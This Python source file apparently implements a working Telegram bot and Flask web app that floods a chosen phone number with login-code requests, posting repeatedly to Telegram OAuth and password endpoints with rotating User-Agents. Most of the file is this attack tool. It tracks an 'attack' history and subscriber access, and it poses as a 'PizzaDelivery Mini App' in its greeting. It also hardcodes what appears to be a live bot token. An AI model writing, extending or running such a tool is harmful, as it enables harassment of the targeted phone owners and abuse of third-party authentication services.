import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
import requests
import random
import time
import threading
from datetime import datetime
import urllib3
import json
import os
import re
from flask import Flask, request, jsonify, send_from_directory, redirect
import hmac
import hashlib

# Отключаем предупреждения
urllib3.disable_warnings()

# ============================================
# КОНФИГУРАЦИЯ
# ============================================

BOT_TOKEN = "8506732439:AAFtQErFaBZ2s49PoEjL9AoazfVqoAq1HbY"
ADMIN_ID = 6747528307
CHANNEL_LINK = "https://t.me/scyzestg"
CHANNEL_USERNAME = "@scyzestg"
BOT_USERNAME = "FrostNetBot"  # username вашего бота

# Пути
BOT_PATH = os.path.dirname(os.path.abspath(__file__))
WEB_PATH = os.path.join(BOT_PATH, "web")
os.makedirs(WEB_PATH, exist_ok=True)

# Базы данных
USERS_DB = os.path.join(BOT_PATH, "users.json")
STATS_DB = os.path.join(BOT_PATH, "stats.json")
SUBS_DB = os.path.join(BOT_PATH, "subs.json")
ATTACKS_DB = os.path.join(BOT_PATH, "attacks.json")

# ============================================
# ИНИЦИАЛИЗАЦИЯ БАЗ
# ============================================

def init_db():
    for db in [USERS_DB, STATS_DB, SUBS_DB, ATTACKS_DB]:
        if not os.path.exists(db):
            with open(db, 'w') as f:
                if db == STATS_DB:
                    json.dump({
                        "total_users": 0, "total_attacks": 0, 
                        "total_requests": 0, "total_success": 0
                    }, f)
                elif db == SUBS_DB:
                    json.dump({"subscribed": {}}, f)
                elif db == ATTACKS_DB:
                    json.dump({"history": []}, f)
                else:
                    json.dump({"users": {}}, f)

init_db()

# ============================================
# ЗАГРУЗКА ДАННЫХ
# ============================================

def load_data():
    global users, stats, subs, attacks
    with open(USERS_DB, 'r') as f: users = json.load(f)
    with open(STATS_DB, 'r') as f: stats = json.load(f)
    with open(SUBS_DB, 'r') as f: subs = json.load(f)
    with open(ATTACKS_DB, 'r') as f: attacks = json.load(f)

def save_data():
    with open(USERS_DB, 'w') as f: json.dump(users, f)
    with open(STATS_DB, 'w') as f: json.dump(stats, f)
    with open(SUBS_DB, 'w') as f: json.dump(subs, f)
    with open(ATTACKS_DB, 'w') as f: json.dump(attacks, f)

load_data()

# ============================================
# ИНИЦИАЛИЗАЦИЯ БОТА И ВЕБ-СЕРВЕРА
# ============================================

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__, static_folder=WEB_PATH, static_url_path='')
user_sessions = {}

# ============================================
# USER-AGENTS И URL
# ============================================

USER_AGENTS = [
    f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{v}.0.0.0 Safari/537.36'
    for v in range(90, 125)
] + [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36',
]

FLOOD_URLS = [
    {'url': 'https://oauth.telegram.org/auth/request', 'params': {'bot_id': '1017286728'}, 'name': 'Telegram Web'},
    {'url': 'https://translations.telegram.org/auth/request', 'params': {}, 'name': 'Translations'},
    {'url': 'https://my.telegram.org/auth/send_password', 'params': {}, 'name': 'My.Telegram.org'},
    {'url': 'https://oauth.telegram.org/auth/request', 'params': {'bot_id': '5444323279'}, 'name': 'Fragment'},
    {'url': 'https://oauth.telegram.org/auth/request', 'params': {'bot_id': '210944655'}, 'name': 'Combot'},
    {'url': 'https://oauth.telegram.org/auth/request', 'params': {'bot_id': '1803424014'}, 'name': 'Telegram-store'},
    {'url': 'https://oauth.telegram.org/auth/request', 'params': {'bot_id': '1199558236'}, 'name': 'Bot-t'},
    {'url': 'https://oauth.telegram.org/auth/request', 'params': {'bot_id': '319709511'}, 'name': 'Telegrambot.biz'},
    {'url': 'https://oauth.telegram.org/auth/request', 'params': {'bot_id': '1733143901'}, 'name': 'Tbiz.pro'},
    {'url': 'https://oauth.telegram.org/auth/request', 'params': {'bot_id': '5463728243'}, 'name': 'Spot.uz'},
    {'url': 'https://oauth.telegram.org/auth/request', 'params': {'bot_id': '466141824'}, 'name': 'Mipped'},
    {'url': 'https://oauth.telegram.org/auth/request', 'params': {'bot_id': '1093384146'}, 'name': 'Off-bot'},
    {'url': 'https://oauth.telegram.org/auth/request', 'params': {'bot_id': '1852523856'}, 'name': 'Presscode'},
    {'url': 'https://oauth.telegram.org/auth/request', 'params': {'bot_id': '9988776655'}, 'name': 'Contest'},
    {'url': 'https://oauth.telegram.org/auth/request', 'params': {'bot_id': '3344556677'}, 'name': 'InstantView'},
    {'url': 'https://oauth.telegram.org/auth/request', 'params': {'bot_id': '7788990011'}, 'name': 'Schema'},
]

# ============================================
# ПРОВЕРКА ПОДПИСКИ
# ============================================

def check_sub(user_id):
    try:
        chat = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return chat.status in ['creator', 'administrator', 'member']
    except:
        return False

def has_access(user_id):
    return str(user_id) == str(ADMIN_ID) or str(user_id) in subs["subscribed"]

def is_admin(user_id):
    return str(user_id) == str(ADMIN_ID)

# ============================================
# ФУНКЦИЯ ОТПРАВКИ ЗАПРОСА
# ============================================

def send_req(phone, service):
    try:
        phone = re.sub(r'[^\d+]', '', phone)
        if not phone.startswith('+'):
            phone = '+' + phone
        
        url = service['url']
        if service.get('params'):
            params = '&'.join([f"{k}={v}" for k, v in service['params'].items()])
            url = f"{url}?{params}"
        
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        r = requests.post(url, headers=headers, data={'phone': phone}, timeout=5)
        success = r.status_code in [200, 302]
        
        stats["total_requests"] = stats.get("total_requests", 0) + 1
        if success:
            stats["total_success"] = stats.get("total_success", 0) + 1
        save_data()
        
        return success
    except:
        stats["total_requests"] = stats.get("total_requests", 0) + 1
        save_data()
        return False

# ============================================
# ФУНКЦИЯ АТАКИ
# ============================================

def attack_worker(chat_id, phone, user_id):
    msg = bot.send_message(chat_id, f"🔥 Запуск атаки на {phone}\nСервисов: {len(FLOOD_URLS)}")
    
    success = 0
    results = []
    
    for service in FLOOD_URLS:
        if send_req(phone, service):
            success += 1
            results.append(f"✅ {service['name']}")
        else:
            results.append(f"❌ {service['name']}")
        time.sleep(0.3)
    
    stats["total_attacks"] = stats.get("total_attacks", 0) + 1
    
    attack_data = {
        "user_id": user_id,
        "phone": phone,
        "success": success,
        "total": len(FLOOD_URLS),
        "time": datetime.now().isoformat(),
        "results": results[:10]
    }
    attacks["history"].append(attack_data)
    save_data()
    
    text = f"✅ Завершено!\nУспешно: {success}/{len(FLOOD_URLS)}\n\n"
    text += "\n".join(results[:10])
    
    bot.edit_message_text(text, chat_id, msg.message_id)

# ============================================
# ВЕБ-СЕРВЕР (Mini App + Админка)
# ============================================

def verify_telegram_auth(auth_data):
    """Проверка данных авторизации от Telegram"""
    if not auth_data:
        return None
    
    # Создаем копию и удаляем hash
    auth_data = dict(auth_data)
    received_hash = auth_data.pop('hash', '')
    
    # Сортируем и формируем строку для проверки
    items = sorted(auth_data.items())
    data_check_string = '\n'.join([f"{k}={v}" for k, v in items])
    
    # Создаем секретный ключ из токена бота
    secret_key = hashlib.sha256(BOT_TOKEN.encode()).digest()
    
    # Вычисляем HMAC-SHA256
    h = hmac.new(secret_key, data_check_string.encode(), hashlib.sha256)
    
    # Сравниваем hash
    if h.hexdigest() == received_hash:
        return auth_data
    return None

@app.route('/')
def index():
    return send_from_directory(WEB_PATH, 'index.html')

@app.route('/auth')
def auth():
    """Telegram Mini App авторизация"""
    auth_data = verify_telegram_auth(request.args)
    if auth_data:
        user_id = int(auth_data.get('id'))
        # Перенаправляем на главную с данными пользователя
        return redirect(f'/?user_id={user_id}&first_name={auth_data.get("first_name", "")}&auth=1')
    return redirect('/')

@app.route('/api/user/<int:user_id>')
def get_user(user_id):
    """Получение данных пользователя"""
    user_id_str = str(user_id)
    user_data = users["users"].get(user_id_str, {})
    
    return jsonify({
        "id": user_id,
        "first_name": user_data.get("first_name", ""),
        "username": user_data.get("username", ""),
        "is_admin": is_admin(user_id),
        "has_access": has_access(user_id),
        "is_subscribed": check_sub(user_id),
        "stats": {
            "total_attacks": stats.get("total_attacks", 0),
            "user_attacks": len([a for a in attacks["history"] if a["user_id"] == user_id])
        }
    })

@app.route('/api/stats')
def get_stats():
    """Общая статистика"""
    return jsonify({
        "total_users": stats.get("total_users", 0),
        "total_attacks": stats.get("total_attacks", 0),
        "total_requests": stats.get("total_requests", 0),
        "total_success": stats.get("total_success", 0),
        "success_rate": round((stats.get("total_success", 0) / max(stats.get("total_requests", 1), 1)) * 100, 1),
        "subscribers": len(subs["subscribed"]),
        "services": len(FLOOD_URLS)
    })

@app.route('/api/services')
def get_services():
    """Список сервисов"""
    return jsonify([s["name"] for s in FLOOD_URLS])

@app.route('/api/attack', methods=['POST'])
def api_attack():
    """API для запуска атаки"""
    data = request.json
    user_id = data.get('user_id')
    phone = data.get('phone')
    
    if not user_id or not phone:
        return jsonify({"error": "Missing data"}), 400
    
    if not has_access(user_id):
        return jsonify({"error": "No access"}), 403
    
    # Запускаем атаку в отдельном потоке
    thread = threading.Thread(target=attack_worker, args=(user_id, phone, user_id))
    thread.start()
    
    return jsonify({"success": True, "message": "Attack started"})

@app.route('/api/admin/stats')
def admin_stats():
    """Админ статистика"""
    user_id = request.args.get('user_id')
    if not is_admin(user_id):
        return jsonify({"error": "Admin only"}), 403
    
    return jsonify({
        "users": users,
        "stats": stats,
        "subs": subs,
        "attacks": attacks["history"][-50:],  # Последние 50 атак
        "recent_users": list(users["users"].keys())[-20:]
    })

@app.route('/api/admin/mailing', methods=['POST'])
def admin_mailing():
    """Рассылк"""
    data = request.json
    user_id = data.get('user_id')
    text = data.get('text')
    
    if not is_admin(user_id):
        return jsonify({"error": "Admin only"}), 403
    
    def mailing():
        sent = 0
        for uid in users["users"]:
            try:
                bot.send_message(int(uid), text)
                sent += 1
                time.sleep(0.1)
            except:
                pass
        return sent
    
    thread = threading.Thread(target=mailing)
    thread.start()
    
    return jsonify({"success": True, "message": "Mailing started"})

# ============================================
# ТЕЛЕГРАМ КОМАНДЫ
# ============================================

@bot.message_handler(commands=['start'])
def start(msg):
    uid = str(msg.from_user.id)
    
    if uid not in users["users"]:
        users["users"][uid] = {
            "first_seen": str(datetime.now()),
            "username": msg.from_user.username,
            "first_name": msg.from_user.first_name
        }
        stats["total_users"] = len(users["users"])
        save_data()
    
    # Кнопка для открытия Mini App
    webapp_url = f"https://{request.host}" if request else "https://ваш-домен.bothost.ru"
    
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton(
        "🚀 ОТКРЫТЬ MINI APP",
        web_app=WebAppInfo(url=webapp_url)
    ))
    keyboard.add(InlineKeyboardButton("📢 КАНАЛ", url=CHANNEL_LINK))
    
    bot.send_message(
        msg.chat.id,
        f"🍕 **PizzaDelivery Mini App**\n\nНажми кнопку ниже чтобы открыть приложение!",
        reply_markup=keyboard,
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['admin'])
def admin(msg):
    if msg.from_user.id != ADMIN_ID:
        return
    
    webapp_url = f"https://{request.host}" if request else "https://ваш-домен.bothost.ru"
    
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton(
        "👑 АДМИН ПАНЕЛЬ",
        web_app=WebAppInfo(url=webapp_url + "?admin=1")
    ))
    
    bot.send_message(
        msg.chat.id,
        "👑 Админ панель в Mini App",
        reply_markup=keyboard
    )

@bot.message_handler(commands=['stats'])
def stats_cmd(msg):
    text = f"📊 Статистика:\n"
    text += f"👥 Пользователей: {stats.get('total_users', 0)}\n"
    text += f"🔥 Атак: {stats.get('total_attacks', 0)}\n"
    text += f"📨 Запросов: {stats.get('total_requests', 0)}"
    bot.reply_to(msg, text)

# ============================================
# ЗАПУСК
# ============================================

def run_bot():
    while True:
        try:
            bot.infinity_polling(timeout=30)
        except:
            time.sleep(5)

if __name__ == "__main__":
    print("=" * 50)
    print("🍕 PizzaDelivery Bot + Web App")
    print("=" * 50)
    print(f"👑 Admin ID: {ADMIN_ID}")
    print(f"🛠 Services: {len(FLOOD_URLS)}")
    print(f"👥 Users: {stats.get('total_users', 0)}")
    print("=" * 50)
    
    # Запускаем бота в отдельном потоке
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # Запускаем веб-сервер
    app.run(host='0.0.0.0', port=5000, debug=False)